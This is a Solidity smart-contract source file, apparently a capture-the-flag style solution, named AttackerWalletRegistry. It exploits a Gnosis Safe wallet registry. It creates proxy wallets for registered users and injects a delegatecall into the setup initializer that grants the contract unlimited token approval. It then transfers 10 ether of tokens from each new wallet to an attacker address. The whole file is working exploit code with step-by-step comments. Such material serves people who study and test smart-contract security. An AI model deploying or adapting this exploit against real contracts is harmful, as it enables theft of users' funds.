// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackerWalletRegistry {

    address public masterCopyAddress;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) {
        proxyFactory = ProxyFactory(_proxyFactoryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
    }

    // Here we must wrap token approve function, since we want to call it from token address to this contract
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address tokenAddress, address attacker, address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            // we must add to the list of users attacker address and make it proxy owner
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            // create function signature to approve tokens for this contract
            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress);

            // initializer must be GnossisSafe::setup function, since it will be called on new proxy (in GnosisSafeProxyFactory::createProxyWithCallback)
            // We pass arguments to this setup function to approve this contract
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
            GnosisSafeProxy proxy =
            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
            
            // transfer the approved tokens
            IERC20(tokenAddress).transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}